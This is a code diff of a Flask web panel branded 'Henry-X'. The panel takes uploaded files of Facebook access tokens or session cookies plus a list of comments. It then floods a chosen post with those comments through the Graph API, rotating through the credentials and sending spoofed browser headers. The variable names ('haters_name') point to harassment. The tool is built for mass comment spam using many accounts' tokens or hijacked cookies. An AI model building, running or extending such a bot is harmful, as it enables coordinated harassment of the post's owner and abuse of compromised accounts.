@@ -1,191 +1,203 @@
-from flask import Flask, request, redirect, url_for, render_template_string, jsonify
-import requests, time, threading, uuid, datetime
+from flask import Flask, request, redirect, url_for, render_template_string, Response, jsonify
+import requests
+import time
+import threading
+import uuid
 
 app = Flask(__name__)
 
 headers = {
     'Connection': 'keep-alive',
-    'User-Agent': 'Mozilla/5.0',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
 }
 
-logs = {}
-tasks = {}  # {task_id: {"thread": Thread, "paused": bool, "stop": bool, "info": {...}, "start_time": str}}
+logs = {}  # task_id -> list of log lines
+tasks = {}  # task_id -> {"thread":Thread, "paused":bool, "stop":bool, "info": {...}}
 
 def log_message(task_id, msg):
-    logs.setdefault(task_id, []).append(msg)
-    print(msg)
+    if task_id not in logs:
+        logs[task_id] = []
+    logs[task_id].append(msg)
+    print(f"[{task_id}] {msg}")
 
-# -------------------- HOME PANEL --------------------
-HOME_HTML = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Henry-X Tool</title>
-<style>
-body {background: linear-gradient(to right, #9932CC, #FF00FF); font-family: 'Segoe UI', sans-serif; color: white; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;}
-.container {background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); max-width: 650px; margin: 30px auto; padding: 25px; border-radius: 18px; box-shadow: 0 0 25px rgba(255,0,255,0.4);}
-input, select {width: 100%; padding: 12px; margin: 6px 0; border-radius: 10px; border: none; background: rgba(255,255,255,0.1); color: white;}
-input:focus {outline: 2px solid #FF00FF;}
-.button-group {display:flex; flex-direction:column; align-items:center; margin-top:15px;}
-.button-group button {width: 80%; max-width: 350px; padding: 12px; margin: 8px 0; font-size: 16px; font-weight:bold; border:none; border-radius: 12px; cursor:pointer; transition: all 0.3s ease;}
-.start-btn {background: linear-gradient(45deg,#FF1493,#FF69B4); box-shadow:0 0 15px rgba(255,20,147,0.6);}
-.start-btn:hover {transform: scale(1.05);}
-.tasks-btn {background: linear-gradient(45deg,#00CED1,#00FFFF); box-shadow:0 0 15px rgba(0,255,255,0.6);}
-.tasks-btn:hover {transform: scale(1.05);}
-h2 {text-align:center; font-size: 2rem; text-shadow: 0 0 10px #fff;}
-</style>
-</head>
-<body>
-<div class="container">
-<h2>🚀 HENRY-X PANEL</h2>
-<form action="/" method="post" enctype="multipart/form-data">
-    <label>Thread ID</label>
-    <input type="text" name="threadId" required>
-    <label>Prefix</label>
-    <input type="text" name="kidx" required>
-    <label>Choose Method</label>
-    <select name="method" id="method" onchange="toggleFileInputs()" required>
-        <option value="token">Token</option>
-        <option value="cookies">Cookies</option>
-    </select>
-    <div id="tokenDiv">
-        <label>Token File</label>
-        <input type="file" name="tokenFile" accept=".txt">
-    </div>
-    <div id="cookieDiv" style="display:none;">
-        <label>Cookies File</label>
-        <input type="file" name="cookiesFile" accept=".txt">
-    </div>
-    <label>Comments File</label>
-    <input type="file" name="commentsFile" accept=".txt" required>
-    <label>Delay (Seconds)</label>
-    <input type="number" name="time" min="1" required>
-    <div class="button-group">
-        <button type="submit" class="start-btn">Start Task</button>
-        <button type="button" class="tasks-btn" onclick="window.location.href='/tasks-dashboard'">View All Tasks</button>
-    </div>
-</form>
-</div>
-<script>
-function toggleFileInputs() {
-    const method = document.getElementById('method').value;
-    document.getElementById('tokenDiv').style.display = method === 'token' ? 'block' : 'none';
-    document.getElementById('cookieDiv').style.display = method === 'cookies' ? 'block' : 'none';
-}
-</script>
-</body>
-</html>
-"""
-
-# -------------------- TASKS DASHBOARD --------------------
-TASKS_HTML = """
+@app.route('/')
+def home():
+    return render_template_string('''
 <!DOCTYPE html>
 <html>
 <head>
-<title>All Tasks</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Henry Panel</title>
 <style>
-body {background: linear-gradient(to right,#1f0036,#2c003e); font-family: 'Segoe UI', sans-serif; color:white; text-align:center; margin:0; padding:20px;}
-.grid {display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:20px; margin-top:20px;}
-.card {background:rgba(255,255,255,0.08); padding:15px; border-radius:15px; box-shadow:0 0 15px rgba(255,0,255,0.2); cursor:pointer; transition:transform 0.3s ease;}
-.card:hover {transform:scale(1.03);}
-.status-running {color:#0f0; font-weight:bold;}
-.status-stopped {color:#f33; font-weight:bold;}
-.modal {display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;}
-.modal-content {background:#111; padding:20px; border-radius:12px; width:90%; max-width:600px; max-height:70vh; overflow-y:auto; color:#0f0; font-family:monospace; box-shadow:0 0 20px #0f0;}
-.close {color:white; font-size:20px; float:right; cursor:pointer;}
+    body {background: linear-gradient(to right, #9932CC, #FF00FF); font-family: Arial, sans-serif; color: white; text-align:center;}
+    .container {max-width: 650px; background: rgba(0,0,0,0.7); padding: 20px; border-radius: 15px; margin: 20px auto;}
+    input, select {width: 100%; padding: 12px; margin: 6px 0; border-radius: 6px; border: none;}
+    .btn {width: 90%; padding: 12px; margin: 10px auto; font-size: 16px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; transition: transform 0.2s;}
+    .btn:hover {transform: scale(1.05);}
+    .start-btn {background: #FF1493; color: white;}
+    .view-btn {background: #00CED1; color: white;}
 </style>
 </head>
 <body>
-<h2>📋 Active & Past Tasks</h2>
-<div class="grid">
-{% for tid, t in tasks.items() %}
-<div class="card" onclick="openModal('{{tid}}')">
-<p><b>🆔 Task:</b> {{tid}}</p>
-<p><b>🧵 Thread:</b> {{t.info.thread_id}}</p>
-<p><b>⏱ Time:</b> {{t.start_time}}</p>
-<p>Status: <span class="{{'status-running' if not t.stop else 'status-stopped'}}">{{'RUNNING' if not t.stop else 'STOPPED'}}</span></p>
-</div>
-{% endfor %}
-</div>
-
-<div id="logModal" class="modal">
-<div class="modal-content">
-<span class="close" onclick="closeModal()">&times;</span>
-<pre id="logContent">Loading logs...</pre>
-</div>
-</div>
-
+    <div class="container">
+        <h2>🚀 HENRY-X 3.0 🚀</h2>
+        <form action="/" method="post" enctype="multipart/form-data">
+            <label>Post ID</label>
+            <input type="text" name="threadId" required>
+            <label>Enter Prefix</label>
+            <input type="text" name="kidx" required>
+            <label>Choose Method</label>
+            <select name="method" id="method" onchange="toggleFileInputs()" required>
+                <option value="token">Token</option>
+                <option value="cookies">Cookies</option>
+            </select>
+            <div id="tokenDiv">
+                <label>Select Token File</label>
+                <input type="file" name="tokenFile" accept=".txt">
+            </div>
+            <div id="cookieDiv" style="display:none;">
+                <label>Select Cookies File</label>
+                <input type="file" name="cookiesFile" accept=".txt">
+            </div>
+            <label>Comments File</label>
+            <input type="file" name="commentsFile" accept=".txt" required>
+            <label>Delay (Seconds)</label>
+            <input type="number" name="time" min="1" required>
+            <button class="btn start-btn" type="submit">Start Task</button>
+        </form>
+        <button class="btn view-btn" onclick="window.location='/tasks'">View All Tasks</button>
+    </div>
 <script>
-async function openModal(tid){
-    document.getElementById('logModal').style.display = 'flex';
-    const res = await fetch('/logs/'+tid);
-    document.getElementById('logContent').innerText = await res.text();
-}
-function closeModal(){document.getElementById('logModal').style.display='none';}
+    function toggleFileInputs(){
+        const method = document.getElementById('method').value;
+        document.getElementById('tokenDiv').style.display = method === 'token' ? 'block' : 'none';
+        document.getElementById('cookieDiv').style.display = method === 'cookies' ? 'block' : 'none';
+    }
 </script>
 </body>
 </html>
-"""
+''')
 
-@app.route("/", methods=["GET", "POST"])
-def index():
-    if request.method == "POST":
-        method = request.form['method']
-        thread_id = request.form['threadId']
-        kidx = request.form['kidx']
-        delay = int(request.form['time'])
-        comments = request.files['commentsFile'].read().decode().splitlines()
-        if method == 'token':
-            credentials = request.files['tokenFile'].read().decode().splitlines()
-            cred_type = 'access_token'
-        else:
-            credentials = request.files['cookiesFile'].read().decode().splitlines()
-            cred_type = 'Cookie'
+@app.route('/tasks')
+def view_tasks():
+    return render_template_string('''
+<!DOCTYPE html>
+<html>
+<head>
+<title>Tasks</title>
+<style>
+    body {background: linear-gradient(to right,#9932CC,#FF00FF); font-family: Arial, sans-serif; color:white;}
+    .container {max-width: 750px; margin: 20px auto; background: rgba(0,0,0,0.75); padding: 20px; border-radius: 15px;}
+    .task-card {background:#222; border-radius:12px; padding:15px; margin:10px 0; box-shadow:0 0 10px #FF00FF;}
+    .status {font-weight:bold;}
+    .btn {padding:8px 12px; margin:5px; border:none; border-radius:8px; cursor:pointer; font-weight:bold;}
+    .stop-btn {background:#FF4500; color:white;}
+    .pause-btn {background:#FFD700; color:black;}
+    .delete-btn {background:#DC143C; color:white;}
+    pre {background:black; color:lime; padding:8px; border-radius:8px; margin-top:10px;}
+</style>
+<script>
+async function controlTask(action,id){
+    await fetch(`/${action}/${id}`,{method:"POST"});
+    location.reload();
+}
+</script>
+</head>
+<body>
+    <div class="container">
+        <h2 style="text-align:center;">🧵 All Running / Past Tasks</h2>
+        {% for tid, t in tasks.items() %}
+        <div class="task-card">
+            <div><b>Task ID:</b> {{tid}}</div>
+            <div><b>Thread:</b> {{t.info.thread_id}}</div>
+            <div class="status">Status: {% if t.stop %}Stopped{% elif t.paused %}Paused{% else %}Running{% endif %}</div>
+            <button class="btn stop-btn" onclick="controlTask('stop-task','{{tid}}')">🛑 Stop</button>
+            <button class="btn pause-btn" onclick="controlTask('pause-task','{{tid}}')">
+                {% if t.paused %}▶ Resume{% else %}⏸ Pause{% endif %}
+            </button>
+            <button class="btn delete-btn" onclick="controlTask('delete-task','{{tid}}')">🗑 Delete</button>
+            <pre>{% for line in logs.get(tid,[]) %}{{line}}
+{% endfor %}</pre>
+        </div>
+        {% endfor %}
+        {% if not tasks %}<p>No tasks found.</p>{% endif %}
+    </div>
+</body>
+</html>
+''', tasks=tasks, logs=logs)
 
-        task_id = str(uuid.uuid4())
-        tasks[task_id] = {"paused": False, "stop": False,
-                          "info": {"thread_id": thread_id},
-                          "start_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-        logs[task_id] = []
-        t = threading.Thread(target=comment_sender, args=(task_id, thread_id, kidx, delay, credentials, cred_type, comments))
-        tasks[task_id]["thread"] = t
-        t.start()
-        return redirect(url_for("index"))
-    return render_template_string(HOME_HTML)
+@app.route('/stop-task/<task_id>', methods=['POST'])
+def stop_task(task_id):
+    if task_id in tasks:
+        tasks[task_id]["stop"] = True
+    return '', 204
 
-@app.route("/tasks-dashboard")
-def task_dashboard():
-    return render_template_string(TASKS_HTML, tasks=tasks)
+@app.route('/pause-task/<task_id>', methods=['POST'])
+def pause_task(task_id):
+    if task_id in tasks:
+        tasks[task_id]["paused"] = not tasks[task_id]["paused"]
+    return '', 204
 
-@app.route("/logs/<task_id>")
-def get_logs(task_id):
-    return "\n".join(logs.get(task_id, []))
+@app.route('/delete-task/<task_id>', methods=['POST'])
+def delete_task(task_id):
+    if task_id in tasks:
+        tasks.pop(task_id)
+    if task_id in logs:
+        logs.pop(task_id)
+    return '', 204
 
-def comment_sender(task_id, thread_id, kidx, delay, credentials, cred_type, comments):
-    post_url = f"https://graph.facebook.com/v15.0/{thread_id}/comments"
+def comment_sender(task_id, thread_id, haters_name, speed, credentials, cred_type, comments):
+    post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
     i = 0
     while i < len(comments) and not tasks[task_id]["stop"]:
         if tasks[task_id]["paused"]:
             time.sleep(1)
             continue
         cred = credentials[i % len(credentials)]
-        params = {'message': f"{kidx} {comments[i].strip()}"}
+        parameters = {'message': f"{haters_name} {comments[i].strip()}"}
         try:
             if cred_type == 'access_token':
-                params['access_token'] = cred
-                r = requests.post(post_url, json=params, headers=headers)
+                parameters['access_token'] = cred
+                response = requests.post(post_url, json=parameters, headers=headers)
             else:
                 headers['Cookie'] = cred
-                r = requests.post(post_url, data=params, headers=headers)
-            log_message(task_id, f"[{'✅' if r.ok else '❌'}] Comment {i+1}")
+                response = requests.post(post_url, data=parameters, headers=headers)
+            if response.ok:
+                log_message(task_id,f"[+] Comment {i+1} sent ✅")
+            else:
+                log_message(task_id,f"[x] Failed to send Comment {i+1} ❌")
         except Exception as e:
-            log_message(task_id, f"[ERROR] {e}")
+            log_message(task_id,f"[!] Error: {e}")
         i += 1
-        time.sleep(delay)
-    log_message(task_id, "🛑 Task Finished or Stopped.")
+        time.sleep(speed)
+    log_message(task_id,"🛑 Task stopped/finished.")
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+@app.route('/', methods=['POST'])
+def start_task():
+    method = request.form['method']
+    thread_id = request.form['threadId']
+    haters_name = request.form['kidx']
+    speed = int(request.form['time'])
+    comments = request.files['commentsFile'].read().decode().splitlines()
+    if method == 'token':
+        credentials = request.files['tokenFile'].read().decode().splitlines()
+        cred_type = 'access_token'
+    else:
+        credentials = request.files['cookiesFile'].read().decode().splitlines()
+        cred_type = 'Cookie'
+    task_id = str(uuid.uuid4())
+    tasks[task_id] = {"paused":False,"stop":False,"info":{"thread_id":thread_id}}
+    logs[task_id] = []
+    log_message(task_id,f"🚀 Task started for Thread {thread_id}")
+    t = threading.Thread(target=comment_sender, args=(task_id,thread_id,haters_name,speed,credentials,cred_type,comments))
+    tasks[task_id]["thread"] = t
+    t.start()
+    return redirect(url_for('view_tasks'))
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
